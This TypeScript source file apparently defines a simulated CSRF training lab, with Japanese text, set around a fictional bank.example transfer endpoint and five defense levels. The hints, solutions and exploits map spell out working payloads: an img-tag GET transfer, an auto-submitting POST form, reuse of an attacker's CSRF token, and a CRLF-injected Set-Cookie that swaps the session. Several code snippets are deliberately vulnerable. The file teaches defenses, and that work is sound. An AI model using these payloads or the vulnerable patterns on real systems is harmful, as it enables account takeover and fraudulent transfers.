import type { AttackResult, Lab, LabInput, Level, LevelSpec } from "./types";
import { traced } from "./trace";

/**
 * Simulated CSRF lab.
 *
 * Scenario: the victim is logged in to bank.example (session cookie set). The
 * attacker writes a malicious page; we simulate the victim's browser loading it
 * and firing the resulting request at the bank's /transfer endpoint, with the
 * session cookie auto-attached. The bank applies CSRF defenses per level.
 * Objective: get an unauthorized transfer to the attacker to succeed.
 */

const BANK_ORIGIN = "bank.example";
const ATTACKER_REFERER = "https://evil.example/";
const VICTIM_SESSION = "s-victim";
/** Per-session secret the attacker's page cannot read (SOP). */
const VICTIM_CSRF_TOKEN = "a9f3c1d7-7e21-4b8c-9f02-sErVeRsEcReT";
const ATTACKER_SESSION = "s-attacker";
/** Token issued to the attacker's own login — they can read their own page. */
const ATTACKER_CSRF_TOKEN = "csrf-issued-attacker";
const ISSUED_TOKENS = new Set([VICTIM_CSRF_TOKEN, ATTACKER_CSRF_TOKEN]);

interface SimRequest {
  method: "GET" | "POST";
  params: Record<string, string>;
  /** Empty string models a suppressed Referer (no-referrer). */
  referer: string;
  /** Session id injected via CRLF in a Set-Cookie header. */
  injectedSession?: string;
}

function attr(attrs: string, name: string): string | undefined {
  const m = attrs.match(new RegExp(`\\b${name}\\s*=\\s*["']?([^"' >]*)`, "i"));
  return m ? m[1] : undefined;
}

function parseQuery(url: string): Record<string, string> {
  const out: Record<string, string> = {};
  const qi = url.indexOf("?");
  if (qi === -1) return out;
  for (const pair of url.slice(qi + 1).split("&")) {
    const [k, v = ""] = pair.split("=");
    if (k) out[decodeURIComponent(k)] = decodeURIComponent(v);
  }
  return out;
}

function decodeCrlf(s: string): string {
  return s
    .replace(/%0d%0a/gi, "\r\n")
    .replace(/%0d/gi, "\r")
    .replace(/%0a/gi, "\n")
    .replace(/%20/gi, " ")
    .replace(/\\r\\n/g, "\r\n");
}

/** Header injection: user input concatenated into Set-Cookie without stripping CR/LF. */
function findInjectedSession(html: string): string | undefined {
  const decoded = decodeCrlf(html);
  const m = decoded.match(/Set-Cookie\s*:\s*session=([^\s;"']+)/i);
  return m?.[1];
}

function tokenFor(sessionId: string): string {
  if (sessionId === ATTACKER_SESSION) return ATTACKER_CSRF_TOKEN;
  return VICTIM_CSRF_TOKEN;
}

function parseForm(html: string, referer: string): SimRequest | null {
  const form = html.match(/<form\b([^>]*)>([\s\S]*?)<\/form>/i);
  if (!form || !/transfer/i.test(attr(form[1], "action") ?? "")) return null;
  const method = (attr(form[1], "method") ?? "get").toLowerCase() === "post" ? "POST" : "GET";
  const params: Record<string, string> = {};
  const inputRe = /<input\b([^>]*)>/gi;
  let m: RegExpExecArray | null;
  while ((m = inputRe.exec(form[2]))) {
    const name = attr(m[1], "name");
    if (name) params[name] = attr(m[1], "value") ?? "";
  }
  return { method, params, referer, injectedSession: findInjectedSession(html) };
}

/** Parse the attacker's HTML into the cross-site request it would trigger. */
function parseAttack(html: string): SimRequest | null {
  const noReferrer = /no-referrer|noreferrer/i.test(html);
  const referer = noReferrer ? "" : ATTACKER_REFERER;

  const formReq = parseForm(html, referer);
  if (formReq) return formReq;

  const src = html.match(
    /<(?:img|iframe|script)\b[^>]*\bsrc\s*=\s*["']?([^"' >]*transfer[^"' >]*)/i,
  );
  if (src) {
    return { method: "GET", params: parseQuery(src[1]), referer, injectedSession: findInjectedSession(html) };
  }
  return null;
}

interface BankResult {
  ok: boolean;
  reason: string;
  sessionId: string;
}

function bank(level: Level, req: SimRequest | null): BankResult {
  if (!req) return { ok: false, reason: "送金リクエストが見つかりません。", sessionId: VICTIM_SESSION };

  if (level === 5) {
    return {
      ok: false,
      reason: "SameSite=Strict により Cookie が送られず未認証。CRLF もヘッダ値から除去されます。",
      sessionId: VICTIM_SESSION,
    };
  }

  const sessionId =
    level === 4 && req.injectedSession ? req.injectedSession : VICTIM_SESSION;

  if (level >= 2 && req.method !== "POST") {
    return { ok: false, reason: "GET による状態変更は拒否されました（POST 必須）。", sessionId };
  }

  if (level === 3) {
    // Token must have been issued, but it is looked up globally — not session.csrfToken.
    if (!ISSUED_TOKENS.has(req.params.csrf_token ?? "")) {
      return { ok: false, reason: "CSRF トークンが無効です。", sessionId };
    }
  }

  if (level === 4) {
    const expected = tokenFor(sessionId);
    if (req.params.csrf_token !== expected) {
      return {
        ok: false,
        reason: "CSRF トークンがこのセッションに紐づいていません。",
        sessionId,
      };
    }
  }

  const to = req.params.to;
  const amount = Number(req.params.amount);
  if (!to || !(amount > 0)) {
    return { ok: false, reason: "送金先または金額が不正です。", sessionId };
  }
  return { ok: true, reason: `${to} へ ${amount} 円を送金しました。`, sessionId };
}

function run(level: Level, input: LabInput): AttackResult {
  const html = input.html ?? "";
  const req = parseAttack(html);
  const output: string[] = [];

  output.push("// 被害者 (bank.example にログイン済み) が悪性ページを閲覧…");
  if (!req) {
    output.push("→ /transfer への自動リクエストは発生しませんでした。");
    return {
      solved: false,
      output,
      note: "transfer エンドポイントへ自動で送られるリクエスト（img の GET か自動送信フォーム）を作りましょう。",
    };
  }

  if (req.injectedSession) {
    output.push(`→ GET https://${BANK_ORIGIN}/set-lang  (CRLF を含むクエリ)`);
    output.push(`   Set-Cookie: session=${req.injectedSession}  ← 注入された Cookie`);
  }
  output.push(`→ ${req.method} https://${BANK_ORIGIN}/transfer`);
  output.push(`   params : ${JSON.stringify(req.params)}`);
  output.push(`   Referer: ${req.referer || "(なし)"}`);
  const result = bank(level, req);
  const cookie =
    level === 5
      ? "(SameSite=Strict により送信されない)"
      : `session=${result.sessionId}`;
  output.push(`   Cookie : ${cookie}`);
  output.push("");
  output.push(result.ok ? `[200 OK] ${result.reason}` : `[403 BLOCKED] ${result.reason}`);

  return traced(
    {
      solved: result.ok,
      output,
      note: result.ok
        ? "被害者のブラウザ経由で不正送金が成立しました。"
        : "送金はブロックされました。防御を回避する手口を考えましょう。",
    },
    [
      req.injectedSession ? `Set-Cookie: session=${req.injectedSession}` : null,
      `${req.method} /transfer ${JSON.stringify(req.params)}`,
      `Cookie: session=${result.sessionId}`,
    ]
      .filter(Boolean)
      .join("\n"),
    result.ok
      ? {
          recap: [
            "被害者ブラウザが罠ページを開いた",
            req.injectedSession ? "CRLF でセッション Cookie を差し替えた" : "クロスサイトで transfer が送られた",
            `${req.params.to ?? "attacker"} へ ${req.params.amount ?? "?"} 円が動いた`,
          ],
        }
      : undefined,
  );
}

const levels: Record<Level, LevelSpec> = {
  1: {
    defense: "防御なし。/transfer は GET でも実行される。",
    hints: [
      "「ソース」タブを読みましょう。/transfer は何を確認していますか？ 被害者のブラウザに『自動で』リクエストを送らせる方法は？",
      "被害者のブラウザが『自動で』銀行へリクエストを送る HTML は？ 画像の読み込みはクリック不要で発火します。",
      "`<img>` の `src` に、送金の URL（`to` と `amount` を付けた GET）を指定しましょう。",
    ],
    solution:
      '`<img src="https://bank.example/transfer?to=attacker&amount=10000">` を入力。画像読み込みで GET が自動送信され、被害者の Cookie が付与されます。',
    code: `app.get("/transfer", (req, res) => {
  transfer(session.user, req.query.to, req.query.amount); // 無防備
});`,
  },
  2: {
    defense: "状態変更は POST のみ許可（GET を拒否）。",
    hints: [
      "Lv1 の手口は通りません。「ソース」で、サーバーが何を拒否しているか確認しましょう。",
      "GET は拒否されます。クリックなしで POST を送るには、自動送信するフォームを使います。",
      "`method=post` の `<form>` を用意し、`<script>` から `document.forms[0].submit()` を呼びましょう。",
    ],
    solution:
      '自動送信フォームを入力:\n`<form action="https://bank.example/transfer" method="post"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`',
    code: `app.post("/transfer", (req, res) => {
  transfer(session.user, req.body.to, req.body.amount); // POST だが CSRF 対策なし
});`,
  },
  3: {
    defense: "CSRF トークンを要求する。ただし『発行済みか』だけ見て、今のセッションとは照合しない。",
    hints: [
      "Lv2 のフォームはトークン無しなので落ちます。ソースはトークンをどう照合していますか？",
      "攻撃者は被害者のトークンを読めません。自分の口座で発行されたトークンなら持てます。",
      "フォームに、自分用に発行済みの `csrf-issued-attacker` を載せて POST します。",
    ],
    solution:
      '自動送信フォームに `<input name="csrf_token" value="csrf-issued-attacker">` を追加。サーバーは発行済み集合に含まれるかだけ見るため、他人のセッションのリクエストにも自分のトークンが通ります。',
    code: `if (!issuedTokens.has(req.body.csrf_token)) return res.status(403);
// issuedTokens は全ユーザー共通。session.csrfToken とは比べていない
transfer(session.user, req.body.to, req.body.amount);`,
  },
  4: {
    defense: "トークンをセッションに紐づける。ただし lang Cookie の値がヘッダに CRLF 無検証で入る。",
    hints: [
      "他人のトークンは、今のセッション（被害者）には紐づかないので落ちます。",
      "ソースの `Set-Cookie: lang=` は入力をそのままヘッダに連結しています。改行はどうなりますか？",
      "先に `%0d%0aSet-Cookie:%20session=s-attacker` でセッション Cookie を差し替え、そのセッション用トークンをフォームに載せます。",
    ],
    solution:
      '`<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">` でセッション Cookie を上書きし、フォームのトークンを `csrf-issued-attacker` にします。CRLF 注入（HTTP ヘッダインジェクション）で、トークンを知っているセッションを被害者ブラウザに載せる典型です。',
    code: `if (req.body.csrf_token !== sessions[req.cookies.session].csrfToken) deny();
res.setHeader("Set-Cookie", "lang=" + req.query.l); // \\r\\n を除去していない`,
  },
  5: {
    defense: "セッションに紐づく乱数トークンを厳密比較し、Cookie は SameSite=Strict。ヘッダ値から CRLF を除去する。",
    hints: [
      "正しいトークンはサーバだけが知っており、Cookie はクロスサイトでは送られません。これは正しい対策です。",
      "「ソース」と「解説」を読み、同期トークンと SameSite Cookie、ヘッダの改行除去がそれぞれ何を防いでいるかを整理しましょう。",
    ],
    solution:
      "このレベルは意図的に突破不可能です。攻撃者はセッション固有のランダムトークンを知り得ず、SameSite=Strict の Cookie もクロスサイトでは送信されません。ヘッダへ出す値からは CR/LF を落とすため、Cookie の差し替えもできません。",
    code: `if (req.body.csrf_token !== session.csrfToken) return res.status(403);
res.cookie("session", id, { sameSite: "strict", httpOnly: true });
res.setHeader("Set-Cookie", "lang=" + stripCrlf(req.query.l));`,
  },
};

const EXPLOIT_FORM = (extraFields: string) =>
  `<form action="https://bank.example/transfer" method="post">${extraFields}<input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>`;

const CRLF_IMG =
  '<img src="https://bank.example/set-lang?l=en%0d%0aSet-Cookie:%20session=s-attacker">';

export const csrfLab: Lab = {
  meta: {
    id: "csrf",
    title: "CSRF — 不正送金",
    shortTitle: "CSRF",
    category: "セッション / リクエスト偽造",
    objective: "ログイン中の被害者に、攻撃者宛ての送金を気づかせず実行させる。",
    summary: "悪性ページから被害者のセッションで銀行の送金リクエストを強制する。",
    standards: {
      owasp: {
        code: "A01:2021",
        name: "Broken Access Control",
        url: "https://owasp.org/Top10/A01_2021-Broken_Access_Control",
      },
      cwe: [
        { id: 352, name: "Cross-Site Request Forgery (CSRF)" },
        { id: 113, name: "Improper Neutralization of CRLF Sequences in HTTP Headers (HTTP Response Splitting)" },
      ],
    },
    references: [
      {
        title: "OWASP Cross-Site Request Forgery Prevention Cheat Sheet",
        url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Request_Forgery_Prevention_Cheat_Sheet.html",
      },
      { title: "PortSwigger Web Security Academy — CSRF", url: "https://portswigger.net/web-security/csrf" },
      { title: "IPA 安全なウェブサイトの作り方", url: "https://www.ipa.go.jp/security/vuln/websecurity/" },
    ],
  },
  fields: [
    {
      name: "html",
      label: "攻撃ページの HTML（被害者が閲覧する）",
      placeholder: '<img src="https://bank.example/transfer?to=attacker&amount=10000">',
      multiline: true,
      mono: true,
      default: "<h1>かわいい子猫の写真</h1>",
    },
  ],
  explanation: `CSRF（クロスサイトリクエストフォージェリ）は、ログイン中の利用者のブラウザが『本人の意図しないリクエスト』を信頼済みサイトへ送らされる攻撃です。ブラウザはリクエストに自動で Cookie（セッション）を付けるため、攻撃者が用意した別サイトのページからでも、被害者の権限で操作（送金・設定変更など）を実行できてしまいます。

このラボでは、被害者は bank.example にログイン済みです。あなたが用意した HTML を被害者が開くと、そのブラウザが銀行の /transfer へリクエストを送ります。攻撃者宛ての送金を成立させられればクリアです。

レベルが上がると対策の種類が変わります。POST 必須のあと、CSRF トークンを入れても『発行済みか』しか見ないと、攻撃者は自分の口座で受け取ったトークンを被害者のリクエストに載せられます。トークンをセッションに紐づけても、\`Set-Cookie\` へユーザー入力を連結して CR/LF を消していないと、HTTP ヘッダインジェクションで \`session\` Cookie を差し替え、トークンを知っているセッションを被害者ブラウザに載せられます。

根本対策は Lv5 です。セッションごとのランダムな同期トークンをそのセッションと厳密に照合し、Cookie を SameSite=Strict・HttpOnly にし、ヘッダに出す値から CR/LF を除去します。`,
  levels,
  run,
  exploits: {
    1: { html: '<img src="https://bank.example/transfer?to=attacker&amount=10000">' },
    2: { html: EXPLOIT_FORM("") },
    3: { html: EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`) },
    4: {
      html:
        CRLF_IMG + EXPLOIT_FORM(`<input name="csrf_token" value="${ATTACKER_CSRF_TOKEN}">`),
    },
  },
};
